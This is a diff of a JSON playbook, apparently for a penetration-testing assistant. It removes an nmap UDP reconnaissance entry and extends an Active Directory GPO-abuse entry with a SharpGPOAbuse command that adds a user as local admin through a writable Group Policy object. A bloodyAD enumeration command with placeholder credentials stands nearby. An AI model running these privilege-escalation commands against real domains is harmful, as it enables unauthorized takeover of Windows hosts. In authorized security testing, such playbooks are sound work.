@@ -158,57 +158,6 @@
       ]
     },
     {
-      "id": "nmap-udp-top",
-      "title": "Nmap Focused UDP Check",
-      "hypothesis": "Scanning UDP is slow, noisy, and simple to overdo, yet a narrow pass can surface DNS, SNMP, Kerberos, NTP, TFTP, and other services that reshape your route. Save it for after the TCP backbone is mapped, or when the TCP results are thin.",
-      "tool": "nmap",
-      "tools": [
-        "nmap"
-      ],
-      "os": [
-        "linux",
-        "windows"
-      ],
-      "requires_all": [
-        "host.up"
-      ],
-      "requires_any": [],
-      "obsoleted_by": [
-        "scan.nmap.udp"
-      ],
-      "deprioritize_when": [
-        "loot.ntds",
-        "scan.nmap.version",
-        "foothold.linux",
-        "foothold.windows",
-        "access.shell"
-      ],
-      "produces": [
-        "scan.nmap.udp"
-      ],
-      "priority": 10,
-      "phase": "recon",
-      "proves": "produces evidence from a narrowly scoped UDP scan",
-      "does_not_prove": "UDP exposure by itself, not that the service is exploitable, and no access, credential, or privilege",
-      "report": {
-        "finding": "Focused UDP Surface Checked",
-        "severity": "informational"
-      },
-      "refs": [],
-      "commands": [
-        {
-          "tool": "nmap",
-          "run": "sudo nmap -Pn -sU --top-ports 20 --open -oN {{scandir}}/nmap-udp-top20.txt {{target}}",
-          "note": "A workable UDP starting point. It requires elevated rights and can be slow, but it picks up the UDP services that tend to be important."
-        },
-        {
-          "tool": "nmap",
-          "run": "sudo nmap -Pn -sU -p 53,67,68,69,88,123,137,138,161,162,500,514,520,1900,4500 --open -oN {{scandir}}/nmap-udp-common.txt {{target}}",
-          "note": "A hand-picked UDP port list covering DNS, DHCP, TFTP, Kerberos, NTP, NetBIOS, SNMP, VPN, syslog, routing, UPnP, and IPsec."
-        }
-      ]
-    },
-    {
       "diagnostic": true,
       "eliminates": [
         "ad-orientation"
@@ -3935,7 +3884,9 @@
       "tools": [
         "pygpoabuse",
         "netexec",
-        "bloodyad"
+        "bloodyad",
+        "sharpgpoabuse",
+        "powershell"
       ],
       "os": [
         "windows"
@@ -3973,6 +3924,12 @@
           "tool": "bloodyAD",
           "run": "bloodyAD --host {{target}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail",
           "note": "List every object this account can write to, the groupPolicyContainer entries are the writable GPOs, and their cn is the {{gpo_id}} the pygpoabuse command needs. netexec has NO gpo_privesc module (it aborts); bloodyAD is the real, runnable enumerator. BloodHound's 'GPO' edges show the same on the Domain tab."
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "run": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {{user}} --GPOName \"{{gpo_name|Default Domain Policy}}\"; gpupdate /force",
+          "note": "On-host alternative when you hold a Windows foothold on a linked computer: inject local-admin membership into the writable GPO by display name and force an immediate Group Policy refresh."
         }
       ]
     },
